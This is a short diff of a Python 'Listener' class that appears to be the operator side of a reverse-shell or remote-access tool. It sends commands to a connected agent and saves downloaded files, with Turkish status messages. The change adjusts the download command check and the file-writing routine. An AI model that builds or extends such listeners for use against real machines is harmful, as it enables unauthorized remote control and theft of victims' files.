@@ -45,7 +45,7 @@ class Listener:
                     return exit()
             
 
-            if command.startswith("download"):
+            if command.startswith("download "):
                 self.reliable_send(command)
 
             elif self.is_system_command(command):
@@ -70,11 +70,25 @@ class Listener:
         if subprocess.run(["which", cmd_parts[0]], capture_output=True).returncode == 0:
             return True
         return False
+    
 
-    def write_file(self, path, content):
-        with open(path, "wb") as file:
+    # def write_file(self, path, content):
+    #     if content is not None:     
+    #         with open(path, "wb") as file:
+    #             file.write(content)
+    #             print(content)
+    #         return "[+] Dosya indiriliyor"
+    #     else:
+    #         return "[-] Dosya indirme hatası: İçerik boş"
+
+
+    def write_file(self,path, content):
+        with open(path, "+wb") as file:
             file.write(content)
-            return "[+] Dosya indiriliyor"
+            print(content)
+        return "[+] Dosya indiriliyor"
+    
+
 
     def run(self):
         while True:
